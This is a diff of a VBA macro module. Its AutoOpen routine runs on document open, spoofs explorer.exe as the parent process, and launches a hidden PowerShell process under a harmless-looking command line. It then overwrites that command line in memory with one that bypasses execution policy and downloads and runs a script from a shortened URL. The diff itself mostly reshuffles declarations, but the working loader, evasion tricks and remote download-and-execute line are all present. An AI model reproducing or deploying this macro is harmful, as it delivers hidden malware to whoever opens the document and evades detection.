@@ -12,74 +12,11 @@ Const MAX_PATH = 260
 '''''''''''''''''''''''''''''''''''''''''''''''''''
 ''''''''''''''' Data types ''''''''''''''''''''''''
 '''''''''''''''''''''''''''''''''''''''''''''''''''
- 
 
 Private Type LARGE_INTEGER
     lowpart                         As Long
     highpart                        As Long
 End Type
-
-Private Type UNICODE_STRING64
-    Length                          As Integer
-    MaxLength                       As Integer
-    lPad                            As Long
-    lpBuffer                        As LongPtr
-End Type
-
-Private Type RTL_USER_PROCESS_PARAMETERS
-    Reserved1(15) As Byte
-    Reserved2(9) As Long
-    CurrentDirectoryPath As UNICODE_STRING64
-    CurrentDirectoryHandle As LongPtr
-    DllPath As UNICODE_STRING64
-    ImagePathName As UNICODE_STRING64
-    CommandLine As UNICODE_STRING64
-    Environment As LongPtr
-End Type
-
-Private Type PROCESS_BASIC_INFORMATION
-    ExitStatus                      As Long
-    Reserved0                       As Long
-    PebBaseAddress                  As LongPtr
-    AffinityMask                    As LARGE_INTEGER
-    BasePriority                    As Long
-    Reserved1                       As Long
-    uUniqueProcessId                As LARGE_INTEGER
-    uInheritedFromUniqueProcessId   As LARGE_INTEGER
-End Type
-
-Private Type PEB
-    Reserved1(1) As Byte
-    BeingDebugged As Byte
-    Reserved2(20) As Byte
-    Ldr As Long
-    ProcessParameters As LongPtr
-    Reserved3(519) As Byte
-    PostProcessInitRoutine As Long
-    Reserved4(135) As Byte
-    SessionId As Long
-End Type
-
-Private Declare PtrSafe Function NtQueryInformationProcess Lib "ntdll" ( _
-                         ByVal hProcess As LongPtr, _
-                         ByVal ProcessInformationClass As Long, _
-                         ByRef pProcessInformation As Any, _
-                         ByVal uProcessInformationLength As Long, _
-                         ByRef puReturnLength As LongPtr) As Long
-                         
-Private Declare PtrSafe Function NtReadVirtualMemory Lib "ntdll" ( _
-                         ByVal hProcess As LongPtr, _
-                         ByVal BaseAddress As LongPtr, _
-                         ByRef Buffer As Any, _
-                         ByVal BufferBytesToRead As Long, _
-                         ByRef ReturnLength As LARGE_INTEGER) As Long
-
-Private Declare PtrSafe Function NtWriteVirtualMemory Lib "ntdll" ( _
-                         ByVal hProcess As LongPtr, _
-                         ByVal VABA As Any, _
-                         ByVal lpBuffer As Any, _
-                         ByVal nSS As Long, _
-                         ByRef NOBW As LARGE_INTEGER) As Boolean
 
 Private Type PROCESS_INFORMATION
     hProcess As LongPtr
@@ -108,13 +45,62 @@ Private Type STARTUP_INFO
     hStdOutput As LongPtr
     hStdError As LongPtr
 End Type
- 
+
 Private Type STARTUPINFOEX
     STARTUPINFO As STARTUP_INFO
     lpAttributelist As LongPtr
 End Type
 
+Private Type PROCESS_BASIC_INFORMATION
+    ExitStatus      As Long
+    Reserved0       As Long
+    PebBaseAddress  As LongPtr
+    AffinityMask    As LARGE_INTEGER
+    BasePriority    As Long
+    Reserved1       As Long
+    uUniqueProcessId As LARGE_INTEGER
+    uInheritedFromUniqueProcessId As LARGE_INTEGER
+End Type
+
+
+Private Declare PtrSafe Function NtQueryInformationProcess Lib "ntdll" ( _
+   ByVal hProcess As LongPtr, _
+   ByVal ProcessInformationClass As Long, _
+   ByRef pProcessInformation As Any, _
+   ByVal uProcessInformationLength As Long, _
+   ByRef puReturnLength As LongPtr _
+) As Long
 ' From https://foren.activevb.de/archiv/vb-net/thread-76040/beitrag-76164/ReadProcessMemory-fuer-GetComma/
+Private Type PEB
+    Reserved1(1) As Byte
+    BeingDebugged As Byte
+    Reserved2(20) As Byte
+    Ldr As Long
+    ProcessParameters As LongPtr
+    Reserved3(519) As Byte
+    PostProcessInitRoutine As Long
+    Reserved4(135) As Byte
+    SessionId As Long
+End Type
+
+
+Private Type UNICODE_STRING64
+    Length As Integer
+    MaximumLength As Integer
+    lPad As Long
+    lpBuffer As LongPtr
+End Type
+
+Private Type RTL_USER_PROCESS_PARAMETERS
+    Reserved1(15) As Byte
+    Reserved2(9) As Long
+    CurrentDirectoryPath As UNICODE_STRING64
+    CurrentDirectoryHandle As LongPtr
+    DllPath As UNICODE_STRING64
+    ImagePathName As UNICODE_STRING64
+    CommandLine As UNICODE_STRING64
+    Environment As LongPtr
+End Type
 
 Private Type PROCESSENTRY32
     dwSize As Long
@@ -151,7 +137,7 @@ Private Declare PtrSafe Function OpenProcess Lib "kernel32.dll" ( _
     ByVal fInherit As Long, _
     ByVal hObject As Long _
 ) As LongPtr
- 
+
 Private Declare PtrSafe Function HeapAlloc Lib "kernel32.dll" ( _
     ByVal hHeap As LongPtr, _
     ByVal dwFlags As Long, _
@@ -181,17 +167,33 @@ Private Declare PtrSafe Function CreateToolhelp32Snapshot Lib "kernel32.dll" ( _
     ByVal dwFlags As Integer, _
     ByVal th32ProcessID As Integer _
 ) As Long
- 
+
 Private Declare PtrSafe Function Process32First Lib "kernel32.dll" ( _
     ByVal hSnapshot As LongPtr, _
     ByRef lppe As PROCESSENTRY32 _
 ) As Boolean
- 
+
 Private Declare PtrSafe Function Process32Next Lib "kernel32.dll" ( _
     ByVal hSnapshot As LongPtr, _
     ByRef lppe As PROCESSENTRY32 _
 ) As Boolean
 
+
+Private Declare PtrSafe Function NtReadVirtualMemory Lib "ntdll" ( _
+    ByVal hProcess As LongPtr, _
+    ByVal BaseAddress As LongPtr, _
+    ByRef Buffer As Any, _
+    ByVal BufferBytesToRead As Long, _
+    ByRef ReturnLength As LARGE_INTEGER _
+) As Long
+
+Private Declare PtrSafe Function NtWriteVirtualMemory Lib "ntdll" ( _
+    ByVal hProcess As LongPtr, _
+    ByVal VABA As Any, _
+    ByVal lpBuffer As Any, _
+    ByVal nSS As Long, _
+    ByRef NOBW As LARGE_INTEGER _
+) As Boolean
 
 Private Declare PtrSafe Function ResumeThread Lib "kernel32.dll" (ByVal hThread As LongPtr) As Long
 
@@ -208,9 +210,9 @@ Public Function getPidByName(ByVal name As String) As Integer
     Dim snapshot As LongPtr
 
     snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, ByVal 0&)
- 
+
     continueSearching = Process32First(snapshot, pEntry)
- 
+
     Do
         If InStr(1, pEntry.szexeFile, name) Then
             getPidByName = pEntry.th32ProcessID
@@ -231,9 +233,9 @@ Public Function convertStr(ByVal str As String) As Byte()
         result(j + 1) = &H0
         j = j + 2
     Next
-    
+
     convertStr = result
-    
+
 End Function
 
 
@@ -247,13 +249,11 @@ Sub AutoOpen()
     Dim threadAttribSize As Long
     Dim parentHandle As LongPtr
     Dim originalCli As String
-    
+
     originalCli = "powershell.exe -NoExit -c Get-Service -DisplayName '*network*' | Where-Object { $_.Status -eq 'Running' } | Sort-Object DisplayName"
-    
-    
+
     ' Get a handle on the process to be used as a parent
     pid = getPidByName("explorer.exe")
-    
     parentHandle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
 
     ' Initialize process attribute list
@@ -268,7 +268,7 @@ Sub AutoOpen()
 
     ' Set the size of cb (see https://docs.microsoft.com/en-us/windows/desktop/api/winbase/ns-winbase-_startupinfoexa#remarks)
     si.STARTUPINFO.cb = LenB(si)
-    
+
     ' Hide new process window
     si.STARTUPINFO.dwFlags = 1
     si.STARTUPINFO.wShowWindow = SW_HIDE
@@ -296,23 +296,20 @@ Sub AutoOpen()
     Dim cmdStr As String
     Dim cmd() As Byte
     Dim liRet As LARGE_INTEGER
-    
+
     newProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, False, pi.dwProcessId)
 
     result = NtQueryInformationProcess(newProcessHandle, 0, pbi, Len(pbi), size)
- 
+
     success = NtReadVirtualMemory(newProcessHandle, pbi.PebBaseAddress, PEB, Len(PEB), liRet)
 
     ' peb.ProcessParameters now contains the address to the parameters - read them
     success = NtReadVirtualMemory(newProcessHandle, PEB.ProcessParameters, parameters, Len(parameters), liRet)
     blah = Err.LastDllError
-    
     cmdStr = "powershell.exe -noexit -ep bypass -c IEX((New-Object System.Net.WebClient).DownloadString('http://bit.ly/2TxpA4h'))  #"
-    
+
     cmd = convertStr(cmdStr)
     success = NtWriteVirtualMemory(newProcessHandle, parameters.CommandLine.lpBuffer, StrPtr(cmd), 2 * Len(cmdStr), liRet)
     ResumeThread (pi.hThread)
-    
+
 End Sub
-
-
